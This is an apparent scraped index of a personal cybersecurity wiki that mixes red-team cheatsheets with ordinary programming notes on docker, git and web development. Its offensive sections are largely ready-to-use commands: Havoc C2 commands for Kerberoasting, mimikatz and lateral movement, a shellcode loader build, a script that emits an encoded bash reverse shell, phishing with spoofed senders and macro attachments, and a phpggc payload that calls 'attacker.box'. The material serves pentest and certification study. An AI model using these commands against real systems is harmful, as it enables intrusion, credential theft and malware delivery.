released highlighting how the scanners were converted to BOFs and will cover the following topics:\nDynamic Resolution of Win32 APIs and generating function declaration mappings automatically Compiling larger BOFs with multiple c files Improved BOF output through batching prints In the meantime, you can enjoy using the tool by downloading it from github: https://github.com/fyxme/portscanbof\nInitial release After converting the application to a BOF and cleaning up the output, we get the following:\nThe code and usage guide has been released publicly and can be found here: https://github.com/fyxme/portscanbof\nThe tool may have been update since this blog was written. See the corresponding GitHub repository for up to date information.\nFuture improvements Add async/multi-threading support for TCP scan - This has been added since this blog was written. Still need to do more testing but good for now ARP scan Add the ability to check if the host is alive before running a TCP scan (similar to how cobaltstrike does it) Additional arguments including timeout, number of threads, only scan 1 ip per host, etc Add sleep delay option between ICMP requests to prevent DOS and improve OPSEC (approx 1 second delay from ping.exe) Fix code and Makefile for compiling exe’s code refactor, and ensure all failure checks are validated (ie. memory allocation failures, etc) UDP scan IPV6 Support Linux support References https://gist.github.com/dascandy/544acdfdc907051bcaa0b51d6d4a334a https://github.com/rvrsh3ll/BOF_Collection/blob/master/Network/PortScan/PortScan.c https://github.com/tijme/amd-ryzen-master-driver-v17-exploit https://trustedsec.com/blog/bofs-for-script-kiddies https://blog.cybershenanigans.space/posts/thanatos-agent https://blog.cybershenanigans.space/posts/writing-bofs-without-dfr/ https://www.elastic.co/security-labs/detonating-beacons-to-illuminate-detection-gaps https://beej.us/guide/bgnet/html/split/ https://tangentsoft.com/wskfaq/ https://blog.cybershenanigans.space/posts/writing-bofs-without-dfr/#intro https://github.com/rvrsh3ll/BOF_Collection/blob/master/Network/PortScan/portscan.cna https://github.com/wsummerhill/C2_RedTeam_CheatSheets/blob/main/CobaltStrike/BOF_Collections.md https://github.com/phra/PEzor/blob/b4e5927775de49735e22dc4b352b7e45d750cb15/bof.cpp#L151 https://frn.sh/posts/sockets/ "},"title":"Replicating Cobalt Strike's Port Scanner BOF for Open-Source C2 | Fast OPSEC-Aware Ping \u0026 TCP Connect Scanning in C"},"/bazaar/":{"data":{"":" Warning\nThe bazaar is at a very early stage. Anything and everything may change for better or worse.\nA bazaar or souk is a marketplace consisting of multiple small stalls or shops, especially in the Middle East, the Balkans, Central Asia, North Africa and South Asia. They are traditionally located in vaulted or covered streets that have doors on each end and served as a city’s central marketplace.\nIn other terms, the cyber bazaar is a place for structured chaos where you can (sometimes) find cyber things you need (and sometimes stuff you don’t need).\nA wiki / cheatsheet combination of some sorts with some magic dust sprinkled in there.\nImportant\nThe goal is to have quick references to various tools and knowledge that is helpful for cybersecurity, speedrunning ctfs/boot2root/certs and other useful programming knowledge.\nA lot of the techniques described here are very noisy and might not be OPSEC safe. Tread with caution and do your own research if you want to utilise some of the techniques during pentesting or red teaming engagements.","faq#FAQ":"Will I find everything I need here? No\nAt what stage of completion is this? Eternal work in progress\nWhy make yet another cybersecurity cheatsheet? I like the stock\nWhere did you get the image? Yonked it at gunpoint from an AI on the internet.\n“I’ve seen this before, you yonked it from X…” X borrowed from Y who borrowed it from Z who asked an LLM to generate the code for him.\nThe references try to highlight where the code or information was found. If references are missing, feel free to contact me and I will be happy to update them."},"title":"bazaar"},"/bazaar/ai/inference-providers/":{"data":{"":"","free-api-providers#Free API providers":"There’s a number of free Inference providers with APIs available:\nhttps://build.nvidia.com/explore/discover - Nvidia NIM API - free API for opensource models like Kimi K2 https://openrouter.ai/models?q=free - a number of free daily requests (heavily rate limited) "},"title":"Inference providers"},"/bazaar/c2-and-red-team-tools/":{"data":{"":"","#":" Tbd\nPivoting does your ticket have network permissions? sometimes easier to use ptt to pass the ticket or steal a token from the machine that has network privilege on behalf of the machine "},"title":"_index"},"/bazaar/c2-and-red-team-tools/havoc/":{"data":{"":"","#":" Note\nC5Spider (the Author) is currently doing a re-write of Havoc which will most likely improve it’s capabilities and stability. See the havoc repo’s rewrite branch for more details.\nHavoc is still a new C2 framework and has some limitations, things it cannot do and things that may break. Also the havoc client can be a little resource hungry… During OSEP Exam, my VM crashed a few times because of it or the havoc client process was killed. Also had computer crashes but that is most likely a combination of this and Offsec’s proctoring extension.\nCommands # https://github.com/HavocFramework/Havoc/blob/main/WIKI.MD#commands # ~~~ Non-exhaustive list below ~~~ # fork and run. nice to start a second beacon in case the first one dies or something shellcode spawn x64 /payloads/demon.x64.bin # ADCS adcs_enum # Kerberoasting get-spns kerberoast \u003cspn\u003e # run PE inline (exe) - builtin to Havoc - https://github.com/fortra/No-Consolation noconsolation /tools/mimikatz/x64/mimikatz.exe \"klist exit\" # dotnet inline execute dotnet inline-execute \"/tools/SharpCollection/NetFramework_4.7_Any/SharpView.exe\" Find-LocalAdminAccess # Socks Proxy socks add 4242 # dont forget to edit your /etc/proxychains4.conf proxychains4 netexec smb dc01.pinecorp.local -u deamian -p Winter2000 -M gpp_autologin -M gpp_password # port forwarding (usefull to forward a webserver or something) # w/o for firewall settings on the beacon's host rportfwd .... # enum local sessions enumlocalsessions sessions quser schtaskenum netview klist # dir remote share and cat content of file dir \"\\\\dc01.pinecorp.local\\SYSVOL\" cat \"\\\\dc01.pinecorp.local\\SYSVOL\\pinecorp.local/Policies/{EA980932-BE55-11EF-B70F-579199F31135}/Machine/Preferences/Registry/Registry.xml\" # lateral movement # requires LatLoader bof: https://github.com/icyguider/LatLoader # trkwks4185 is the name of your pipe as defined in your SMB listener config LatLoader xorload dev01.pinecorp.local /payloads/smb.x64.bin pivot connect dev01.pinecorp.local trkwks4185 # search for files that end in .psm1 recursively (good to find flag.txt and what not) dir C:\\users /s /b /f /ends .psm1 Modules enumfiles (File search / grep) Tbd\nLatLoader (Lateral Movement) LatLoader | LatLoader is a PoC module to demonstrate automated lateral movement with the Havoc C2 framework. # lateral movement LatLoader xorload dev01.pinecorp.local /payloads/smb.x64.bin # if it doesnt return ExecMethod Succeeded! but writes successfully, the script might need to be realoaded.. script manager \u003e LatLoader \u003e right click \u003e reload # dont forget to connect to host if you used an smb beacon pivot connect dev01.pinecorp.local trkwks4185 Shhhhloader (Obfuscated Dropper) Shhhhloader | Syscall Shellcode Loader Decent obfuscation tool. However, can sometimes break because of obscure havoc profile configurations…\nUse the GUI button in the navbar to generate your payload.\nWarning\nThe tool currently doesn’t support grabbing the payloads from the listeners directly. You have to generate them prior and upload them via the file input in the GUI.\nUAC-BOF-Bonanza (UAC Bypass BOF) UAC-BOF-Bonanza Tbd\nUntested but look interesting\nHighBorn (UAC Bypass BOF) HighBorn Tbd\nUntested but look interesting\nPre-compiled binaries # run PE inline (non C# exe) noconsolation /tools/mimikatz/x64/mimikatz.exe \"klist exit\" # dotnet inline execute (C# exe) dotnet inline-execute \"/tools/SharpCollection/NetFramework_4.7_Any/SharpView.exe\" Find-LocalAdminAccess Dotnet C# binaries:\nhttps://github.com/r3motecontrol/Ghostpack-CompiledBinaries https://github.com/Flangvik/SharpCollection Havoc Profiles Warning\nI’ve had issues with listeners not working properly and not binding correctly. I recommend adding the listeners to your profile directly and if you have to modify or update one, do it from the profile config file and restart the server. (You will not loose your data… but beacons might die if you change the communication protocols, ports etc…)\npython3 havoc_profile_generator.py Ref: https://github.com/Ghost53574/havoc_profile_generator\nLimitations Havoc doesn’t support import-powershell so you need to do it yourself when running a powershell command:\npowershell import-module C:\\windows\\tasks\\somemodule.ps1; Invoke-ModuleCMD Ref: https://github.com/HavocFramework/Havoc/issues/492#issuecomment-2198213157"},"title":"Havoc"},"/bazaar/c2-and-red-team-tools/malware-droppers/":{"data":{"":"","#":" Important\nUse open source malware droppers when playing in testing environments… You don’t want to burn your own dropper when playing around.\nHooka Can be run in Linux and generate Windows binaries (cross platform compilation) Golang # simplest command ./build/hooka_linux_amd64 -i ~/webserver/smb.x64.bin -o imdone.exe # the more shit you add the buggier it might be... and less likely to run # glhf ./build/hooka_linux_amd64 -i ~/webserver/smb.x64.bin -o imdone.exe --proc explorer.exe _ _ _ _ | | | | ___ ___ | | __ __ _ | | | |_| | / _ \\ / _ \\ | |/ / / _` | | | | _ | | (_) | | (_) | | \u003c | (_| | |_| |_| |_| \\___/ \\___/ |_|\\_\\ \\__,_| (_) [*] Obtaining shellcode from /home/lo/webserver/smb.x64.bin \u003e Shellcode is in raw format [*] Defining evasion techniques... [*] Using suspendedprocess technique to execute shellcode [*] Obfuscating variables and functions... [*] Compiling shellcode loader... \u003e Payload format is set to EXE \u003e go build -o imdone.exe loader.go \u003e 3154432 bytes written to imdone.exe [+] Loader file entropy: 6.9330213473661955 [+] Checksums: \u003e MD5: 6666b187280d31537b083c69631b636c \u003e SHA1: 64ff907b7c9d94564ce5857145dd70d8b4761044 \u003e SHA256: d9b5fc90dcd569ae2f00b7dc7bb1ddeae28e1cacc201628afa7d809061dfe561 [+] Shellcode loader has been successfully generated Invoke-Obfuscation https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide https://github.com/danielbohannon/Invoke-Obfuscation https://x.com/dmcxblue/status/1879176230098157962?t=bhHdazl7dNhn39P3g5jVpw\u0026s=19 References https://github.com/mttaggart/rustyneedle https://github.com/joaoviictorti/RustRedOps "},"title":"Malware Droppers"},"/bazaar/computer-science--programming/":{"data":{"":""},"title":"_index"},"/bazaar/computer-science--programming/ai-tools/":{"data":{"":"","clinehttpsdocsclinebot#\u003ca href=\"https://docs.cline.bot/\"\u003eCline\u003c/a\u003e":"Cline Cline is an AI development assistant which integrates with Microsoft Visual Studio Code. It provides an interface between your IDE and LLMs facilitating code development, increasing productivity and lowering the barrier to entry for new coders. Depending on permissions, Cline can read/write files, execute commands, use your web browser, and expand its capabilities with Model Context Protocol servers.\nWhat Can Cline Do? Cline is your AI assistant that can:\nEdit and create files in your project Run terminal commands Search and analyze your code Help debug and fix issues Automate repetitive tasks Integrate with external tools Usage Start a Task Type your request in the chat Example: “Create a new React component called Header” Provide Context Use @ mentions to add files, folders, or URLs Example: “@file:src/components/App.tsx” Review Changes Cline will show diffs before making changes You can edit or reject changes "},"title":"AI tools"},"/bazaar/computer-science--programming/dependency-visualisation/":{"data":{"":"","python#python":"pipenv pipenv graph pipdeptree: Python dependency tree # installation pipx install pipdeptree Using pipdeptree to write requirements.txt file $ pipdeptree --warn silence | grep -E '^\\w+' Flask==0.10.1 gnureadline==8.0.0 Lookupy==0.1 pipdeptree==2.0.0b1 setuptools==47.1.1 wheel==0.34.2 Using pipdeptree inside venv pipdeptree -fl --python /home/u/.local/share/virtualenvs/myenv-AAAAAA/bin/python "},"title":"Dependency visualisation"},"/bazaar/computer-science--programming/docker/":{"data":{"":"","#":"Migrating docker volume from one server to another Using docker run + tar (Manual Backup \u0026 Restore)** Stop the container (if running): docker stop \u003ccontainer_name\u003e Create a backup of the volume on the source host: docker run --rm -v \u003cvolume_name\u003e:/volume -v $(pwd):/backup busybox tar czf /backup/\u003cbackup_file\u003e.tar.gz -C /volume ./ This creates a compressed .tar.gz file with all volume data.\nTransfer the backup file to the new host using scp, rsync, or any file transfer method scp \u003cbackup_file\u003e.tar.gz user@new_host:/path/to/backup/ Restore the volume on the destination host: docker volume create \u003cnew_volume_name\u003e docker run --rm -v \u003cnew_volume_name\u003e:/volume -v $(pwd):/backup busybox sh -c \"tar xzf /backup/\u003cbackup_file\u003e.tar.gz -C /volume\" This extracts the backup into a new volume.\nStart your container with the new volume: docker run -v \u003cnew_volume_name\u003e:/path/in/container ... "},"title":"docker"},"/bazaar/computer-science--programming/file-synchronisation/":{"data":{"":"","rsync#Rsync":" # rsync -avPh src dst rsync -avPh example test@10.10.10.10:. # needs to be installed on both local and remote # apt update \u0026\u0026 apt get install rsync #'use -avP' and 'know how a trailing slash changes what rsync does' are basically the two rules that cover 99% of all rsync usage. "},"title":"file synchronisation"},"/bazaar/computer-science--programming/git/":{"data":{"":"","#":"Git signing Get git signing key ID:\n# get keys gpg --list-secret-keys --keyid-format SHORT # key id is the one after rsa4096 rsa4096/XXXXXXXX Setup .gitconfig to sign automatically:\n.gitconfig[user] useConfigOnly = true email = ... signingkey = \u003cXXXXXXXX\u003e [commit] gpgSign = true [tag] gpgSign = true ref: https://git-scm.com/book/ms/v2/Git-Tools-Signing-Your-Work ref: https://withblue.ink/2020/05/17/how-and-why-to-sign-git-commits.html\nGit diff(ing): Generating and Applying code patches # GENERATING # head -1 git format-patch -1 HEAD # head - 3 to head git format-patch HEAD~3..HEAD # generating a single patch across multiple commits git format-patch cc1dde0dd^..6de6d4b06 --stdout \u003e foo.patch # generating diff from tags (can use --stat to only get the number of lines changed) git diff 2.0.0 1.0.0 --stat # generating patches for uncommited changes git diff \u003e my-changes.patch # APPLYING git apply \u003cpatch-file\u003e ref: https://www.geeksforgeeks.org/how-to-generate-and-apply-patches-with-git/\nUsing linux diff command Can also be done from linux diff commands directly:\n# GENERATING # new code has the new changes we want to make as part of the patch diff -ru \u003cold code\u003e \u003cnew code\u003e \u003e mychanges.patch # APPLYING # need to be in the directory in which you want to make the diff changes from patch -i mychanges.patch Encrypted git repos Tbd\nhttps://git-annex.branchable.com/tips/fully_encrypted_git_repositories_with_gcrypt/ Git Convetional Commits See versioning"},"title":"git"},"/bazaar/computer-science--programming/image-modifications/":{"data":{"":"","converting-pdf-to-png#Converting PDF to png":"Using imagemagick:\nconvert example.pdf example.png If you get an error about some PDF policy, make sure you have ghostcript installed (gs --version) and comment out the following line in the /etc/ImageMagick-6/policy.xml file:\n\u003cpolicy domain=\"coder\" rights=\"none\" pattern=\"PDF\" /\u003e "},"title":"Image modifications"},"/bazaar/computer-science--programming/latex/":{"data":{"":"","pandoc#Pandoc":"Installation sudo apt update sudo apt install pandoc Latex to PDF pandoc example.tex -o example.pdf --pdf-engine=pdflatex # xelatex supports more fonts and might give better results. YMMV. pandoc example.tex -o example.pdf --pdf-engine=xelatex # adding metadata pandoc example.tex -o example.pdf \\ --pdf-engine=xelatex \\ --template=my_template.tex \\ # Use a custom template --metadata title=\"My PDF\" \\ # Set document metadata --metadata author=\"fyx(me)\" Ref: https://www.reddit.com/r/LaTeX/comments/cj0j8h/pdflatex_or_xelatex/\nInstalling pdflatex and xelatex engines sudo apt update sudo apt install texlive-latex-base texlive-latex-extra texlive-fonts-recommended texlive-xetex "},"title":"latex"},"/bazaar/computer-science--programming/orchestration-workflows/":{"data":{"":"","#":"Workflow orchestration tldr: A fancy cron runner with advanced workflow management, status monitoring, alerting, etc…\nCyber security use cases:\nMonitoring tasks Scheduled offensive/defensive scan triggers Daily Enumeration workflows data pipelines and more… Prefect Prefect offers modern orchestration solutions to empower data teams to build resilient workflows that scale with versatile resource needs.\nRef: https://www.prefect.io/\nApache Airflow Apache Airflow® is a platform created by the community to programmatically author, schedule and monitor workflows.\nRef: https://airflow.apache.org/\nDifference between CI-CD runners and Workflow orchestrators Difference between CI-CD runners like Github actions and Workflow orchestrators like Airflow and Perfect?\nAs to the differences, GitHub actions is generally a “on commit, do something”, like build an image, run tests, linting, build documentation, etc. It’s a tool generally to automate actions on your repository.\nAirflow and Prefect are orchestration systems. They’re not tied to a repo and can do a wider variety of things. For example, every day at 4am run a daily report for the prior business day. Every weekend retain our ML models by spinning up some Amazon ECS tasks. Every half an hour hit an external API and digest it’s data into our data lake.\n[…] GitHub actions… Can be shoehorned to do orchestration in a limited fashion, but it’s not quite the intent.\nPrefect and airflow are, however, explicitly designed to do it. For Prefect, that means I dictate how things are run (containers, dask workers, other), I can specific what to happen on failure (retry, pagerduty alert, slack warnings, etc), and many other things that in general make my life easier bridging the proof of concept to fully productionised system easier.\nRef: https://www.reddit.com/r/mlops/comments/13ulfux/airflow_vs_github_actions_workflows/"},"title":"orchestration (workflows)"},"/bazaar/computer-science--programming/versioning/":{"data":{"":"","#":"Semver : Semantic versioning ref: https://semver.org/\nGiven a version number MAJOR.MINOR.PATCH, increment the:\nMAJOR version when you make incompatible API changes MINOR version when you add functionality in a backward compatible manner PATCH version when you make backward compatible bug fixes Additional labels for pre-release and build metadata are available as extensions to the MAJOR.MINOR.PATCH format.\nOther ref:\nhttps://www.conventionalcommits.org/en/v1.0.0/ Conventional commits Tldr\nCommit formats: feat(parser): add ability to parse arrays Tags: feat, fix, build, chore, ci, docs, style, refactor, perf, test\nBreaking changes: a footer BREAKING CHANGE:, or appends a ! after the type/scope (eg. fix(parser)!: fixed CVE-XXX by adding input validation)\nThe Conventional Commits specification is a lightweight convention on top of commit messages. It provides an easy set of rules for creating an explicit commit history; which makes it easier to write automated tools on top of. This convention dovetails with SemVer, by describing the features, fixes, and breaking changes made in commit messages.\nThe commit message should be structured as follows:\n\u003ctype\u003e[optional scope]: \u003cdescription\u003e [optional body] [optional footer(s)] The commit contains the following structural elements, to communicate intent to the consumers of your library:\nfix: a commit of the type fix patches a bug in your codebase (this correlates with PATCH in Semantic Versioning). feat: a commit of the type feat introduces a new feature to the codebase (this correlates with MINOR in Semantic Versioning). BREAKING CHANGE: a commit that has a footer BREAKING CHANGE:, or appends a ! after the type/scope, introduces a breaking API change (correlating with MAJOR in Semantic Versioning). A BREAKING CHANGE can be part of commits of any type. types other than fix: and feat: are allowed, for example @commitlint/config-conventional (based on the Angular convention) recommends build:, chore:, ci:, docs:, style:, refactor:, perf:, test:, and others. footers other than BREAKING CHANGE: \u003cdescription\u003e may be provided and follow a convention similar to git trailer format. Additional types are not mandated by the Conventional Commits specification, and have no implicit effect in Semantic Versioning (unless they include a BREAKING CHANGE). A scope may be provided to a commit’s type, to provide additional contextual information and is contained within parenthesis, e.g., feat(parser): add ability to parse arrays.\nRef: https://www.conventionalcommits.org/en/v1.0.0/"},"title":"versioning"},"/bazaar/computer-science--programming/web-dev-cheatsheet/":{"data":{"":"","#":"Tech stack TLDR - Frontend: svelte / react / *nothing* (aka html + javascript) - Backend: Nextjs (javascript) / express (javascript) / flask (python) / Laravel (php) - CSS: Tailwindcss - Runtime: - Javascript (express / nextjs): Deno or Bun - https://docs.deno.com/examples/next_tutorial/ - Good comparaison here: https://betterstack.com/community/guides/scaling-nodejs/nodejs-vs-deno-vs-bun/#security - PHP (laravel): Nginx for easy mode, but recommend FrankenPHP or swoole for speed - https://laravel.com/docs/11.x/deployment#server-configuration - https://dev.to/dimdev/performance-benchmark-of-php-runtimes-2lmc - Python (flask): WSGI server like Gunicorn (might be worth using supervisor too) - https://shivamrana.me/2020/05/flask-prod/ - Databases: - sqlite (for prototyping or small ass website) - postgresql - [optional] supabase - Other: - Queue system (and caching): Redis - Secrets manager: Hashicorp Vault - Reverse proxy: (anton Putra on youtube has great comparaisons) - HAProxy for speed and when using TLS - caddy for ease of use and when using TLS - nginx for speed and stability - traefik for ease of use with orchestrators like docker - sending emails: - resend.com CSS frameworks Utility-based:\nhttps://tailwindcss.com/ Classless (good for prototyping):\nhttps://simplecss.org/ Branding Colors Choosing colors:\nhttps://coolors.co https://www.tailwindshades.com/ Color wheels and color theory:\nhttps://www.figma.com/color-wheel/ https://www.canva.com/colors/color-wheel/ https://www.flux-academy.com/blog/ultimate-guide-to-choosing-colors-for-web-design Fonts https://fonts.google.com/ https://github.com/paper-design/paper-mono/tree/main Icons Generic:\nhttps://lucide.dev/ https://heroicons.com/ Brand Icons:\nhttps://simpleicons.org/ https://github.com/homarr-labs/dashboard-icons/blob/main/ICONS.md Design and image editing https://figma.com https://www.photopea.com/ https://canva.com/ https://www.gimp.org/ Free Stock Photos / placeholder content Favorites:\nhttps://unsplash.com/ https://www.pexels.com/ Others:\nhttps://www.pexels.com/ https://pixabay.com/ https://coverr.co/ https://unsplash.com/ https://pikwizard.com/ https://www.videezy.com/ https://mixkit.co/ https://www.canva.com/ https://mixkit.co/free-stock-video/ gfycat.com - free videos that do need citation https://avopix.com/premium-videos Ref:\nhttps://www.reddit.com/r/PartneredYoutube/comments/11l3hnn/is_there_any_place_i_can_get_cheaper_or_free/ Illustrations https://undraw.co/illustrations/2 SEO Blogging For non-tech-savvy: https://ghost.org/ For tech-savvy (static site generator): https://gohugo.io/ "},"title":"web dev cheatsheet"},"/bazaar/computer-science--programming/web-proxies/":{"data":{"":"","#":"Caddy Common infinite redirect issues cloudflare not in Full TLS mode (strict) The “classic” issue with Cloudflare proxy is when the client connects to Cloudflare over TLS but Cloudflare connects to Caddy over HTTP (Flexible mode), causing Caddy redirecting Cloudflare to HTTPS, but the end client is already on HTTPS, so they try again… and receive a redirect to what looks like the same place, ad nauseum.\ncloudflare dns token is not whitelisted from ipv4 or ipv6 $ journalctl -xeu caddy.service ... Code:9109 Message:Cannot use the access token from location: \u003cip\u003e hostname not being passed down sub.example.com { reverse_proxy http://localhost:10002 { header_up Host {http.reverse_proxy.upstream.host} } } dont forget to reload the service after fixing issues sudo systemctl reload caddy "},"title":"Web Proxies"},"/bazaar/linux/other-commands/":{"data":{"":"","#":"Other Linux Commands # find files and pretty print them find /home -type f -printf \"%f\\t%p\\t%u\\t%g\\t%m\\n\" 2\u003e/dev/null | column -t # find .php files which do not contain \"_SECURE_\" rg --files-without-match \"_SECURE_\" **/*.php "},"title":"Other commands"},"/bazaar/linux/reverse-shells/":{"data":{"":"","#":"Generate a quick bash reverse shell in python genshell.py#!/usr/bin/env python3 import base64 import sys import os if \"-h\" in sys.argv or \"--help\" in sys.argv or len(sys.argv) != 3: print(\"[!] INTERFACES:\") print(os.popen(\"ip a\").read().strip()) print(\"\") print(\"[!] Usage: genshell \u003cIP\u003e \u003cPORT\u003e\") exit(1) ip = sys.argv[1] port = sys.argv[2] rev_shell = f'bash -i \u003e\u0026 /dev/tcp/{ip}/{port} 0\u003e\u00261' print(f'[*] command: {rev_shell}') exec_cmd = f'echo {base64.b64encode(rev_shell.encode()).decode()} | base64 -d | /bin/bash' print(exec_cmd) "},"title":"Reverse Shells"},"/bazaar/linux/system-hardening/":{"data":{"":"","#":"OpenSnitch OpenSnitch is a GNU/Linux interactive application firewall inspired by Little Snitch. Ref: https://github.com/evilsocket/opensnitch\nWarning\nappindicators which is required for the system tray icon is buggy and seems to produce a lot of syslog errors: journalctl --since \"1 hour ago\"\nRecommend installing and using Tray Icons: Reloaded instead: https://extensions.gnome.org/extension/2890/tray-icons-reloaded/\nNote\nWorks more or less with VPNs… YMMV.\nOther speedup configs Caution\nTread at your own risk… A lot of these things can fuck-up your device and might be annoying to undo or fix easily. But we all have installation scripts and backups right…. right?!\nMonitor journalctl --since \"1 hour ago\" for bugs and application errors which might use up battery, or other hardware resources. Need to run as admin to see all messages otherwise you will only see logs related to your system.\ngnome-shell editor: dconf-editor\nTo look into:\nhttps://askubuntu.com/questions/346211/tracker-store-and-tracker-miner-fs-eating-up-my-cpu-on-every-startup Hardening scripts debian-cis Warning\nSome of these may not be desirable to have hardened on host machines.\nRef: https://github.com/ovh/debian-cis\n# Installation # need root to cp into /etc/default/cis-hardening cd debian-cis cp debian/default /etc/default/cis-hardening sed -i \"s#CIS_LIB_DIR=.*#CIS_LIB_DIR='$(pwd)'/lib#\" /etc/default/cis-hardening sed -i \"s#CIS_CHECKS_DIR=.*#CIS_CHECKS_DIR='$(pwd)'/bin/hardening#\" /etc/default/cis-hardening sed -i \"s#CIS_CONF_DIR=.*#CIS_CONF_DIR='$(pwd)'/etc#\" /etc/default/cis-hardening sed -i \"s#CIS_TMP_DIR=.*#CIS_TMP_DIR='$(pwd)'/tmp#\" /etc/default/cis-hardening # Audit everything ./bin/hardening.sh --audit-all # audit single item ./bin/hardening/4.4_logrotate_permissions.sh --audit # Apply a fix / harden ./bin/hardening/4.4_logrotate_permissions.sh --apply "},"title":"system hardening"},"/bazaar/other-cheatsheets/":{"data":{"":"","#":"General https://www.thehacker.recipes/ (Better than hacktricks imo) https://viperone.gitbook.io/pentest-everything (great for AD stuff) hacktricks https://www.ired.team/ - always find gems in here. More oldschool but pretty awesome and well explained https://exploit-notes.hdks.org/ (found when looking for something specific, looks interesting) https://watchdogsacademy.gitbook.io/attacking-active-directory (found when looking at mssql stuff, also has cool shit I think) https://werebug.com/pentest-cheatsheet/ - cool layout for a cheatsheet, mostly basic content https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition - pretty well maintained cheatsheet https://notes.qazeer.io/ Mindmaps https://orange-cyberdefense.github.io/ocd-mindmaps/ (It looks cool but I’ve honestly never used this…) "},"title":"++ cyber cheatsheets"},"/bazaar/other/networking/":{"data":{"":"","tcpflow#tcpflow":"Tool used to examine packet flows inside of a packet capture (pcap):\n# this command generates a report.pdf file tcpflow -r commutative_payload.pcap -a tcpflow Report.pdf example "},"title":"Networking"},"/bazaar/other/password-cracking/":{"data":{"":"","#":"Common Password generation Password generation using Regex # tool installation # pipx install exrex exrex \"((W|w)inter|(S|s)ummer|(F|f)all|(A|a)utumn|(S|s)pring)20(16|17|18|19|20)\" \u003e seasons_months.txt exrex \"((J|j)anuary|(F|f)ebruary|(M|m)arch|(A|a)pril|(M|m)ay|(J|j)une|(J|j)uly|(A|a)ugust|(S|s)eptember|(O|o)ctober|(N|n)ovember|(D|d)ecember)20(16|17|18|19|20)\" \u003e\u003e seasons_months.txt Keyboard Walks Generating keyboard walks based on keyboard layout:\n# https://github.com/hashcat/kwprocessor kwp -z basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route \u003e keymap.txt Ref: https://cyberarms.wordpress.com/2018/02/13/creating-hashcat-keymap-walking-password-wordlists/\nRef https://github.com/Mebus/cupp https://specopssoft.com/blog/predictable-passwords-seasons-and-months/ https://cyberarms.wordpress.com/2018/02/13/creating-hashcat-keymap-walking-password-wordlists/ "},"title":"Password Cracking"},"/bazaar/phishing/":{"data":{"":"","#":" Warning\nWIP… Only added basic commmands now that seem to work quite well for test environments with basic security controls aka MS Defender AV.\nThese most likely wont work against any EDR solution… DYOR.\nWord Macros Important\ndocx word docs don’t execute macros (they may be contained in the document but in read only mode), create a docm or doc instead\nFocus on hta, docm, and js payloads\nMacro pack MacroPack Community is a tool used to automatize obfuscation and generation of retro formats such as MS Office documents or VBS like format. It also handles various shortcuts formats.\n# List all supported file formats macro_pack.exe --listformats # List all available templates macro_pack.exe --listtemplates # Craft a payload ... Note\nThe EmbedExe template has been quite good in the past as it allows you to provide you C2 payload directly via exe or bin , utilising either a smb beacon or http beacon.\nWhen using the smb beacon, you can try and spray the network to guess if its running or not\nSending Emails: swaks To send emails to a mail service (eg. SMTP, IMAP, etc) from the command line, swaks is your go to tool.\nIt provides nice features for attaching documents, spoofing senders, etc.\nSending emails with payloads as attachments # links in body can be used if the user is going to click on it # otherwise you can also attach files to it # --server : mail server # --attach @totally-not-malicious.docm : attach the file name `totally-not-malicious.docm` to the email # --suppress-data : don't print the attachment back to you swaks --from vladimir.putin@target.com --to sam.altman@target.com --header 'Subject: Company Notification' --body 'Hi Sam, we want to hear from you! Please complete the following survey. https://mywebsite.com/mysurvey.hta' --server 10.10.10.10 --attach @totally-not-malicious.docm --suppress-data Refs https://github.com/cymerkabrol/doc-macro-exploit https://github.com/itm4n/VBA-RunPE https://github.com/sevagas/macro_pack https://github.com/Inf0secRabbit/BadAssMacros "},"title":"Phishing"},"/bazaar/web-exploitation/php/":{"data":{"":"","#":"Online PHP runner with various PHP version https://onlinephp.io/\nDangerous functions htmlspecialchars htmlspecialchars — Convert special characters to HTML entities Ref: https://www.php.net/manual/en/function.htmlspecialchars.php\nDepending on the php version, the defaults my be different and not encode all characters. For example ' (single quote) is not converted by default in all PHP versions:\nHTML special chars demo with PHP v7.4.33 vs PHP v8.2.20 Deserialization with phpggc PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.\nIf you need to find libraries used by the application, look for composer.json or composer.lock\n# show list of gadget chains ./phpggc -l # deserialization via phar file # (phar doesnt care about the extension) # ZendFramework/RCE1 gadget selected here, but can be anything that supports __destruct or __wakeup vector ./phpggc -p phar -o /tmp/revshell.anything ZendFramework/RCE1 system \"curl http://attacker.box/phar\" "},"title":"PHP"},"/bazaar/wifi/":{"data":{"":"","fixing-issues-with-drivers#Fixing issues with drivers":" This driver is great for most chipsets: https://github.com/lwfinger/rtw88\nIf having issued with kernel headers sudo apt update sudo apt upgrade sudo apt dist-upgrade sudo reboot # install the linux kernel headers as recommended by the git repo ","gps-device#GPS device":"Difference between GPS and GNSS GPS (Global Positioning System) is a specific satellite navigation system operated by the United States. It’s the most widely used and recognized global positioning system.\nGNSS (Global Navigation Satellite System) is a general term that refers to all satellite-based navigation systems, including:\nGPS (United States) GLONASS (Russia) Galileo (European Union) BeiDou (BDS) (China) QZSS (Japan, regional coverage) NavIC (India, regional coverage) Finding your GPS device lsusb # should be something like `/dev/ttyUSB0`, `/dev/ttyUSB1`, ..., `/dev/ttyACM0`, `/dev/ttyACM1`, etc. ls /dev/tty* Testing with gpsd sudo apt install gpsd gpsd-clients sudo gpsd /dev/ttyACM0 -F /var/run/gpsd.sock cgps -s Using bettercap with a GNSS device # this will show you if you have issues with the gps: # sudo bettercap -iface wlan0 --debug # wlan0 » set gps.device \"/dev/ttyACM0\" # wlan0 » gps on # wlan0 » [16:10:38] [sys.log] [dbg] gps error parsing line ''7@': nmea: sentence does not start with a '$' or '!' # instead you need to start the gpsd service and set bettercap to use that instead as such: # start GPSD with you GNSS device # this will start GPSD on localhost:2947 sudo gpsd /dev/ttyACM0 -F /var/run/gpsd.sock sudo bettercap -iface wlan0 \u003e set gps.device \"localhost:2947\" \u003e gps show ","print-wifi-ssid-from-hash#Print Wifi SSID from hash":" cat dump.hashcat | egrep -v \"^$\" | python2 -c \"import sys; print(''.join([l.split('*')[5].decode('hex')+'\\t'+l for l in sys.stdin]))\" ","wifi#Wifi":"Changing mac address Some APs might try to block you or deauth you when they see you testing Wifi, hence changing your mac address might be helpful to bypass those restrictions:\n# change to a random mac emulating a random vendor MAC of any kind sudo macchanger wlan0 -A "},"title":"_index"},"/bazaar/windows/":{"data":{"":""},"title":"Windows"},"/bazaar/windows/active-directory/":{"data":{"":"Other tools:\nenum4linux-ng 